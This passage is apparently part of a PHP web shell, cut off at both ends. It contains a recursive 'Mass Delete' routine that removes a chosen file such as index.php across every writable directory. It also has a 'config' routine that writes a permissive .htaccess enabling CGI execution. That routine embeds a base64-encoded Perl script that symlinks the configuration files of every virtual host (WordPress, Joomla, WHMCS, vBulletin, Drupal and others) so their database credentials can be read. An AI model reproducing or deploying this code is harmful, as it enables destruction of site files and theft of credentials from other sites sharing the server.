					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=blue>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$alx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['go'] == 'config') {
	$alx = mkdir("alx_config", 0777);
	$isi_htc = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
	$htc = fopen("alx_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	fclose($htc);
	if(preg_match("/vhosts|vhost/", $dir)) {
		$link_config = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
		$vhost = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpvcGVuZGlyKG15ICRkaXIgLCAiL3Zhci93d3cvdmhvc3RzLyIpOw0KZm9yZWFjaChzb3J0IHJlYWRkaXIgJGRpcikgew0KICAgIG15ICRpc0RpciA9IDA7DQogICAgJGlzRGlyID0gMSBpZiAtZCAkXzsNCiRzaXRlc3MgPSAkXzsNCg0KDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3Atb3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2UudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2VzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNhbGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXJzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictbWVtYmVycy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlczEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictZm9ydW1zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmYucGhwJywkc2l0ZXNzLictNS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictNC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLW5ldy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9nL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9ncy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLWJsb2dzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Byb3RhbC93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3Mtc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy90ZXN0L3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJHNpdGVzcy4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb28vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb28udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1tYWluLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmJ+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIzfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIxfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0td2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNwYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VibWl0dGlja2V0LnBocCcsJHNpdGVzcy4nLXdobWNzMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW15c2hvcC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1aQ3Nob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJ0aWNsZS9jb25maWcucGhwJywkc2l0ZXNzLictTndhaHkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy11cDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlL2RiLnBocCcsJHNpdGVzcy4nLTcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29ubmVjdC5waHAnLCRzaXRlc3MuJy1QSFAtRnVzaW9uLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJHNpdGVzcy4nLURydXBhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXIvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy0xbWVtYmVyLnR4dCcpIDsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5ncy50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3JlcXVpcmVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1BTTRTUy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnRzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1iaWxsaW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3QudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RpbmdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9